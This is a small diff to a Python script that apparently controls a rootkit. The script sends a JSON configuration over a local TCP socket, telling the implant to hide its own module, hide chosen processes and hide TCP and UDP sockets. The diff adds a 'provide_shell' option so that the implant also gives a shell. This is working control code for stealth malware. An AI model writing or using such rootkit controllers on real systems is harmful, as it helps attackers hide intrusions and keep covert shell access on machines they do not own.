@@ -28,6 +28,7 @@ target_addr = "127.0.0.1"
 target_port = 23250
 
 conf_json_hide = { "hide_module":         "true",
+                   "provide_shell":       "true",
                    "hide_processes":      ["1"],
                    "hide_sockets_tcp4":   ["tcp4_port_int_1", "tcp4_port_int_2"],
                    "hide_sockets_tcp6":   ["tcp6_port_int_1", "tcp6_port_int_2"],
@@ -35,7 +36,7 @@ conf_json_hide = { "hide_module":         "true",
                    "hide_sockets_udp6":   ["udp6_port_int_1", "udp6_port_int_2"] }
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((target_addr, target_port)) 
+s.connect((target_addr, target_port))
 s.send(json.dumps(conf_json_hide))
 data = s.recv(1024).decode()
 print (data)
